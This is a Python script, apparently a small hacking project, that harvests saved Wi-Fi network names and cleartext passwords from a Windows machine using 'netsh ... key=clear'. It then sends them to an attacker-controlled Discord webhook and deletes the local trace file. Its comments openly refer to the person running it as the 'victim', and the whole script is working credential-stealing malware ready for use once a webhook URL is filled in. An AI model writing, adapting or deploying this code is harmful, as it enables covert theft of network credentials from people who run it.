#Importing os module provides functions for interacting with the operating system.
import os

#Import subprocess so we can use system commands.
import subprocess

#Import re module so we can make use of regular expressions
import re

#Import json module to convert the dictionary into string so that we can write that into a file .
import json 

#discord_webhook let's us use the discord to send us the victim's credential as soon as they execute it.
from discord_webhook import DiscordWebhook, DiscordEmbed

#(subprocess.run(<list of command line arguments go here>, <specify the second argument if you want to capture the output>)).
cmdout = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode() #---->".stdout" is used to store the output information and ".decode()" decodes the stored information .

#here "re" module is used to perform regular expressions  .
#since we want all the ssid's that's listed after "ALL User Profile     :".
#using regular expression we can get all characters untill the return escape sequence "\r" appears.
profile_names = (re.findall("All User Profile     : (.*)\r", cmdout))

#An empty list to store dictionaries containing wifi (usernames) and (passwords) .
wifi_list = []

#This is to ensure we get a valid profile .
if len(profile_names) != 0:
    for name in profile_names: 

        #storing every single wifi connection into a separate dictionary which is later appended to wifi_list .   
        wifi_profile = {}       
        
        #passing netsh commands to retrieve the information about wifi connections .
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
        
        #again using "re" to look for specific data inorder to ignore them.
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            #Adding our ssid name to the dictionary .
            wifi_profile["ssid"] = name

            #Using "key=clear" to obtain the password for that particular ssid .
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
            
            #Using "re" once again to check for password which comes right after "Key Content            :" .
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            
            #if a wifi connection doesn't have any password then it's set to "None" as default .
            if password == None:
                wifi_profile["password"] = None
            else:
                #Password is added to the appropriate ssid as a key in the dictionary.
                wifi_profile["password"] = password[1]
            
            #Here info's are appended to the empty list created before named "wifi_list" .
            wifi_list.append(wifi_profile) 

#writing the obtained credentials into a file.
with open("credentials.txt","w") as formatted_file:
    for i in range(len(wifi_list)):
        #json.dumps() is used to convert the dictionary into string
        #so that it can be written into a file.  
        formatted_file.write(json.dumps((wifi_list[i]))) 
        formatted_file.write("\n")

#Stored credentials are opened to be carried by discord.
f = open("credentials.txt", "r") 

#-discord integration-! 

webhook = DiscordWebhook(url = <your url here> ) #==========> your discord webhook url goes here!

embed = DiscordEmbed(title='Credentials Captured!', description=f.read(), color='00FF00')
embed.set_author(name='c4rb0nX1', url='https://github.com/c4rb0nx1',icon_url='https://i.postimg.cc/ZRzNStMC/IMG-20210331-205034-465.jpg') # if you know....you know
webhook.add_embed(embed)

response = webhook.execute()

f.close()

#removing the created "credentials.txt" file after sending the information on discord.
os.remove("credentials.txt")

#Note: The "credentials.txt" file is created to extend the functionality of the program such as sending it via e-mail in future.
